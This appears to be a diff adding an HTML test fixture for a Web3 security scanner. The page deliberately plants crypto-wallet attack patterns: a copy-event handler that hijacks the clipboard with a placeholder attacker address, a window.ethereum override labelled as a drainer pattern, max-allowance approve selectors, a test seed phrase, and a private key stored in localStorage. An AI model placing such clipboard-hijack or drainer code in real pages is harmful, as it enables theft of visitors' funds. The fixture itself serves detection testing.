@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SecureScope Web3 Demo Page</title>
+  <style>body{font-family:sans-serif;max-width:800px;margin:40px auto;padding:20px}</style>
+</head>
+<body>
+  <h1>Web3 Security Demo Page</h1>
+  <p>This page contains intentional Web3 security patterns for scanner testing.</p>
+
+  <!-- Hidden ETH address (display:none) -->
+  <div style="display:none">0x742d35Cc6634C0532925a3b844Bc9e695Ef5a0dE</div>
+
+  <!-- BTC address (visible) -->
+  <p>Donate BTC: <code>bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq</code></p>
+
+  <!-- Same ETH address repeated (address reuse) -->
+  <p>Contact wallet: <span>0x742d35Cc6634C0532925a3b844Bc9e695Ef5a0dE</span></p>
+  <p>Payment address: <span>0x742d35Cc6634C0532925a3b844Bc9e695Ef5a0dE</span></p>
+
+  <!-- Hidden input with ETH address -->
+  <form>
+    <input type="hidden" name="wallet_address" value="0x742d35Cc6634C0532925a3b844Bc9e695Ef5a0dE">
+  </form>
+
+  <script>
+    // Clipboard hijacking — replaces copied text with attacker address
+    document.addEventListener('copy', function(e) {
+      e.clipboardData.setData('text/plain', '0xDeadBeefDeadBeefDeadBeefDeadBeefDeadBeef');
+      e.preventDefault();
+    });
+
+    // Wallet drainer signature: approve MAX_UINT256
+    const approve_selector = "approve(address,uint256)";
+    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+    const setApprovalForAll_selector = "setApprovalForAll(address,bool)";
+
+    // window.ethereum override (drainer pattern)
+    window.ethereum = {
+      request: function(params) {
+        return Promise.resolve('0xDeadBeefDeadBeefDeadBeefDeadBeefDeadBeef');
+      }
+    };
+
+    // BIP-39 seed phrase (12 words)
+    const seed = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about";
+
+    // localStorage with sensitive key
+    localStorage.setItem('wallet_privateKey', 'demo_value_for_testing');
+  </script>
+</body>
+</html>
